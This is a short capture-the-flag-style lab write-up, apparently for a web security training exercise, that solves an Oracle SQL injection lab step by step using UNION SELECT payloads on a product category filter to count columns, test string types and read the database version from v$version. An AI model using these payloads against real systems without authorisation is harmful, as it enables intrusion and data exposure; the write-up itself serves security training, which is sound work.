# Lab: SQL injection attack, querying the database type and version on Oracle

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4672c18a-6776-44c6-b788-b4702ecd3032)

## Solution

The page has a vulnerability in the product category filter.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/62ea1224-6a35-4ae6-9890-f17ba5696e9f)

Find the `GET` reqest for the prodcut filter in HTTP history and send it to repeater.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/2a2b5262-8e6b-4585-bb91-0f92b2d1deac)

Append `'+UNION+SELECT+NULL,NULL+FROM+dual--` to the filter to find how many rows are being returned> Two rows are being returned.
The query made by the page will be

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL FROM dual--
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a632ded9-c9c2-4adf-8f1f-a9ceca6c1998)

Now to find if both rows are strings by the payload `'+UNION+SELECT+'adc','def'+FROM+dual--` and the result shows both rows are strings.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4ca52908-3603-410d-a8c8-1e48926ef031)

Use the payload `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` to find the version.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/fc92511d-6466-44a3-ba53-ab4193f0a67a)
